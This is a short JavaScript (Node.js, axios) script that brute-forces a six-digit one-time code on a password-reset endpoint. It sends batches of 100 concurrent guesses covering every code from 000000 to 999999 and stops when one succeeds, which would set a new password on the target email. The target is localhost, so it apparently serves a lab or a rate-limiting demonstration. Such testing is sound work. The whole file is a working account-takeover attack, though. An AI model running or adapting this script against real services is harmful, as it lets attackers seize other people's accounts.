const axios = require("axios");

const sendRequest = async (otp) => {
  try {
    const res = await axios.post("http://localhost:3000/reset-password", {
      email: "iodasjiio@gmail.com",
      otp: otp,
      newPassword: "aisjodoasjd"
    });
    console.log(res.data);
    return true; 
  } catch (err) {
    console.error(err.response ? err.response.data : err.message, otp);
    return false; 
  }
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
  const batchSize = 100; // Number of concurrent requests
  for (let i = 0; i <= 999999; i += batchSize) {
    const batch = [];
    for (let j = 0; j < batchSize && i + j <= 999999; j++) {
      const otp = (i + j).toString().padStart(6, '0');
      batch.push(sendRequest(otp));
    }
    const results = await Promise.all(batch);
    if (results.some(success => success)) {
      console.log(`Successful request found in batch starting with OTP: ${i.toString().padStart(6, '0')}`);
      break; 
    }
    await delay(100); 
  }
};

main();